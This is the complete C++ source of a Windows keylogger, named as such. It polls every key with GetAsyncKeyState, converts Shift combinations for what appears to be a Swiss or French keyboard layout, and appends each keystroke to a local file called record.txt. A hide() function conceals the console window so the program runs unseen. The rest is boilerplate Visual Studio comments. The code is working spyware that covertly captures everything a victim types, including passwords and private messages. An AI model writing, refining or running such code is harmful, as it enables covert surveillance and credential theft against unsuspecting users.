// keylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void log();
void hide();

int main()
{
	hide();
	log();
	return 0;
}

void log() {
	
	char key;

	for (;;)
	{
		for (key = 8; key <= 222; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				ofstream write("record.txt", ios::app);
				
				//check if char is a capital letter or not
				if ( (key>64)&&(key<91) && !(GetAsyncKeyState(0x10)) )
				{
					key += 32;
					write << key;
					write.close();
					break;
				}
				else if ((key > 64) && (key < 91))
				{
					write << key;
					write.close();
					break;
				}
				else
				{
					//check chars (depends of the keyboard !)
					switch (key)
					{
					case 48:
						if (GetAsyncKeyState(0x10))
						{
							write << "=";
						}
						else
						{
							write << "0";
						}
						break;
					case 49: 
						if (GetAsyncKeyState(0x10))
						{
							write << "+";
						}
						else
						{
							write << "1";
						}
						break;
					case 50:
						if (GetAsyncKeyState(0x10))
						{
							write << "\"";
						}
						else
						{
							write << "2";
						}
						break;
					case 51:
						if (GetAsyncKeyState(0x10))
						{
							write << "*";
						}
						else
						{
							write << "3";
						}
						break;
					case 52:
						if (GetAsyncKeyState(0x10))
						{
							write << "ç";
						}
						else
						{
							write << "4";
						}
						break;
					case 53:
						if (GetAsyncKeyState(0x10))
						{
							write << "%";
						}
						else
						{
							write << "5";
						}
						break;
					case 54:
						if (GetAsyncKeyState(0x10))
						{
							write << "&";
						}
						else
						{
							write << "6";
						}
						break;
					case 55:
						if (GetAsyncKeyState(0x10))
						{
							write << "/";
						}
						else
						{
							write << "7";
						}
						break;
					case 56:
						if (GetAsyncKeyState(0x10))
						{
							write << "(";
						}
						else
						{
							write << "8";
						}
						break;
					case 57:
						if (GetAsyncKeyState(0x10))
						{
							write << ")";
						}
						else
						{
							write << "9";
						}
						break;
					case VK_SPACE: //space
						write << " ";
						break;
					case VK_RETURN: //new line
						write << "\n";
						break;
					case VK_TAB:
						write << "\t";
						break;
					case VK_BACK:
						write << "<BackSpace>";
						break;
					case VK_ESCAPE:
						write << "<Esc>";
						break;
					case VK_DELETE:
						write << "<Del>";
						break;
					default:
						break;
					}
				}

				/*switch (key) //special chars
				{
				case 8: write << "<BackSpace>";
				case 27: write << "<Esc>";
				case 127: write << "<Del>";
				case 32: write << " ";
				case 13: write << "<Enter>\n";
				default: write << key;
				}*/
			}
		}
	}	
}

//hide windows console
void hide() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
